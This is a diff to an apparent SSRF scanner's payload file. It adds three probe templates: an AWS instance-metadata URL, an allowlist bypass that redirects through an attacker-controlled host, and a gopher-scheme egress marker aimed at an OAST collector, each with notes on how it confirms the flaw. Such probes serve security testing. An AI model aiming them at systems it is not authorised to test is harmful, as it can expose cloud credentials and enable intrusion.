@@ -35,6 +35,18 @@ payloads:
     template: "http://{canary}.{oast_host}/"
     confidence: confirmed
     notes: DNS-rebinding canary subdomain; OAST collector resolves to attacker IP.
+  - id: aws_imds_metadata
+    template: "http://169.254.169.254/latest/meta-data/"
+    confidence: suspected
+    notes: "Link-local AWS IMDS probe; a distinct status or metadata-shaped body versus an external control URL confirms the server actually reached the cloud metadata service."
+  - id: redirect_to_internal
+    template: "http://{oast_host}/redirect/{canary}"
+    confidence: likely
+    notes: "Allowlist-bypass SSRF via an attacker-hosted 30x that redirects to a loopback or metadata address; the OAST callback on the redirector confirms the fetch and that redirects are followed without re-validation."
+  - id: gopher_scheme_marker
+    template: "gopher://{oast_host}/_{canary}"
+    confidence: likely
+    notes: "Non-HTTP scheme-egress marker (gopher) aimed only at the OAST collector; a raw TCP connection logged by OAST confirms the fetcher honors the gopher scheme, with no service-specific commands sent."
 mutations:
   - name: case_flip
     description: URL schemes are case-insensitive; HTTP vs http differential.
